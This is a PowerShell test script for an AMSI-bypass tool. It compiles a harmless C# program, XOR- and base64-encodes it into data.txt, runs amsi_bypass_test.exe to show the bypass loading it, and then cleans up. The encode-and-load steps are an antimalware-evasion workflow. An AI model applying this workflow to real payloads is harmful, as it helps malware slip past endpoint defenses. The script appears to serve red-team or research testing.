$srcDir = "C:\users\localuser\Downloads\Amnesiac-main\Amnesiac-main\amsi-pageguard-veh-master"
$csc    = "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\MSBuild\Current\Bin\Roslyn\csc.exe"

Write-Host "[*] Step 1: Compile test payload..."
$cs = 'using System; class T { static void Main() { Console.WriteLine("[+] PAGE_GUARD bypass verified -- payload executed successfully"); } }'
[IO.File]::WriteAllText("$env:TEMP\amsi_test_payload.cs", $cs, [Text.Encoding]::ASCII)
& $csc /nologo /out:"$env:TEMP\amsi_test_payload.exe" "$env:TEMP\amsi_test_payload.cs"
if ($LASTEXITCODE -ne 0) { Write-Host "[-] Compile failed"; exit 1 }
Write-Host "[+] Payload compiled"

Write-Host "[*] Step 2: XOR+base64 encode into data.txt..."
$bytes = [IO.File]::ReadAllBytes("$env:TEMP\amsi_test_payload.exe")
for ($i = 0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor 0x4B }
[IO.File]::WriteAllText("$srcDir\data.txt", [Convert]::ToBase64String($bytes), [Text.Encoding]::ASCII)
Write-Host "[+] data.txt ready ($($bytes.Length) bytes encoded)"

Write-Host "[*] Step 3: Running amsi_bypass_test.exe..."
Write-Host ""
Set-Location $srcDir
.\amsi_bypass_test.exe

Write-Host ""
Write-Host "[*] Cleaning up..."
Remove-Item "$env:TEMP\amsi_test_payload.cs", "$env:TEMP\amsi_test_payload.exe", "$srcDir\data.txt" -ErrorAction SilentlyContinue
Write-Host "[+] Done"
